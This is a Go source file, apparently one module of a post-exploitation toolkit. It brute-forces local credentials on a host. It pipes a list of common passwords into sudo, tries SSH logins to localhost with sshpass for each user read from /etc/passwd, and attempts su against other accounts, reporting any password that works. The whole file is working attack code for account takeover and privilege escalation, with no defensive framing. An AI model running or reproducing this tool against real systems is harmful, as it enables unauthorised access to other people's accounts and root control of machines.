package module

import (
	"fmt"
	"strings"
)

// ---------------------------------------------------------------------------
// Brute force — local password guessing

// RunBruteSudo attempts common passwords against sudo.
func RunBruteSudo(_ map[string]interface{}) (string, error) {
	var results []string
	results = append(results, "=== SUDO BRUTE FORCE ===")

	// Check passwordless sudo first
	sudoOut, err := run("sudo -n true 2>&1")
	if err == nil {
		_ = sudoOut
		results = append(results, "[+] No password required for sudo!")
		sudoList, _ := run("sudo -n -l 2>/dev/null")
		results = append(results, sudoList)
		return strings.Join(results, "\n"), nil
	}

	found := false
	for _, pw := range commonPasswords {
		cmd := fmt.Sprintf("echo '%s' | timeout 3 sudo -S -k true 2>&1", escapeSQ(pw))
		out, err := run(cmd)
		if err == nil {
			results = append(results, fmt.Sprintf("[+] sudo password found: %s", pw))
			sudoList, _ := run(fmt.Sprintf("echo '%s' | sudo -S -k -l 2>/dev/null", escapeSQ(pw)))
			results = append(results, sudoList)
			found = true
			break
		}
		if !strings.Contains(out, "incorrect") && !strings.Contains(out, "Sorry") {
			results = append(results, fmt.Sprintf("[?] possible hit with '%s': %s", pw, out))
		}
	}
	if !found {
		results = append(results, fmt.Sprintf("[-] No common sudo password found (tried %d)", len(commonPasswords)))
	}
	return strings.Join(results, "\n"), nil
}

// RunBruteSSH attempts common passwords against localhost SSH.
func RunBruteSSH(_ map[string]interface{}) (string, error) {
	var results []string
	results = append(results, "=== SSH BRUTE FORCE ===")

	// Collect local users (non-system)
	usersOut, err := run("awk -F: '$3>=1000&&$3!=65534{print $1}' /etc/passwd 2>/dev/null")
	if err != nil {
		usersOut = "root"
	}
	users := strings.Fields(usersOut)
	if len(users) == 0 {
		users = []string{"root"}
	}

	// Check if sshpass or ssh binary exist
	hasSSHPass := false
	checkOut, _ := run("which sshpass 2>/dev/null")
	if strings.TrimSpace(checkOut) != "" {
		hasSSHPass = true
		results = append(results, "[*] sshpass found")
	}
	checkOut2, _ := run("which ssh 2>/dev/null")
	if strings.TrimSpace(checkOut2) == "" {
		results = append(results, "[-] ssh not available on target")
		return strings.Join(results, "\n"), nil
	}

	if !hasSSHPass {
		results = append(results, "[-] sshpass not installed — testing key-based auth only")
		for _, user := range users {
			cmd := fmt.Sprintf("ssh -o BatchMode=yes -o ConnectTimeout=3 -o StrictHostKeyChecking=no %s@localhost 'echo AUTH_OK' 2>/dev/null", user)
			out, err := run(cmd)
			if err == nil && strings.Contains(out, "AUTH_OK") {
				results = append(results, fmt.Sprintf("[+] %s@localhost: key-based auth works (no password)", user))
			}
		}
		return strings.Join(results, "\n"), nil
	}

	// Try common passwords for each user via sshpass
	for _, user := range users {
		for _, pw := range commonPasswords[:10] {
			cmd := fmt.Sprintf("sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 %s@localhost 'echo AUTH_OK' 2>/dev/null", escapeSQ(pw), user)
			out, err := run(cmd)
			if err == nil && strings.Contains(out, "AUTH_OK") {
				results = append(results, fmt.Sprintf("[+] %s@localhost password: %s", user, pw))
				goto nextUser
			}
		}
	nextUser:
	}
	return strings.Join(results, "\n"), nil
}

// RunBruteLocal attempts common passwords against local user accounts via su.
func RunBruteLocal(_ map[string]interface{}) (string, error) {
	var results []string
	results = append(results, "=== LOCAL PASSWORD BRUTE FORCE ===")

	usersOut, err := run("awk -F: '$3>=1000&&$3!=65534{print $1}' /etc/passwd 2>/dev/null")
	if err != nil {
		usersOut = "root"
	}
	users := strings.Fields(usersOut)
	if len(users) == 0 {
		users = []string{"root"}
	}

	currentUser, _ := run("whoami 2>/dev/null")
	currentUser = strings.TrimSpace(currentUser)

	for _, user := range users {
		if user == currentUser {
			results = append(results, fmt.Sprintf("[*] Skipping current user: %s", user))
			continue
		}
		for _, pw := range commonPasswords {
			cmd := fmt.Sprintf("echo '%s' | timeout 2 su -c 'echo AUTH_OK' %s 2>/dev/null", escapeSQ(pw), user)
			out, err := run(cmd)
			if err == nil && strings.Contains(out, "AUTH_OK") {
				results = append(results, fmt.Sprintf("[+] %s password: %s", user, pw))
				break
			}
		}
	}
	return strings.Join(results, "\n"), nil
}

// RunBruteAll runs all brute force checks.
func RunBruteAll(_ map[string]interface{}) (string, error) {
	var parts []string
	probes := []struct {
		name string
		fn   func(map[string]interface{}) (string, error)
	}{
		{"SUDO", RunBruteSudo},
		{"SSH", RunBruteSSH},
		{"LOCAL", RunBruteLocal},
	}
	for _, p := range probes {
		out, err := p.fn(nil)
		if err != nil {
			parts = append(parts, fmt.Sprintf("=== %s ===\nERROR: %v", p.name, err))
		} else {
			parts = append(parts, fmt.Sprintf("=== %s ===\n%s", p.name, out))
		}
	}
	return strings.Join(parts, "\n\n"), nil
}

